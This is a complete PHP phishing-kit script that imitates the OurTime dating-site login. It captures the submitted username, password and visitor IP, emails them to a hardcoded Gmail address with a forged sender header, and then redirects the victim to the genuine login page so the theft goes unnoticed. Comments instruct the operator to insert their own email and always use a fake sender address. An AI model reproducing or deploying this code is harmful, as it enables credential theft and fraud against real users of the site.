<?php


$ip = getenv("REMOTE_ADDR");
$message .= "---------OurTime Logs b00merang.cc -----------\n";
$message .= "Username : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "IP : ".$ip."\n";
$message .= "---------OurTime Logs b00merang.cc -----------\n";
$recipient = "btfr40@gmail.com";   //YOUR EMAIL HERE
$subject = "OurTIme Logs-$ip";
$headers = "From: services@marketx.bz";  ///BEWARE HERE DONT TOUCH USE ALWAYS FAKE EMAIL AS SENDER TO PREVENT NOT DELIVERING
$headers .= $_POST['$ip']."\n";
mail($recipient,$subject,$message,$headers);

header('location:http://www.ourtime.com/v3/login/?CPSessionID=dc9ad4ce-c9cb-4afe-b4af-eb2cdd16da46&VisitorID=1228272879'.sha1('WorldOfHack'));



exit;


?>
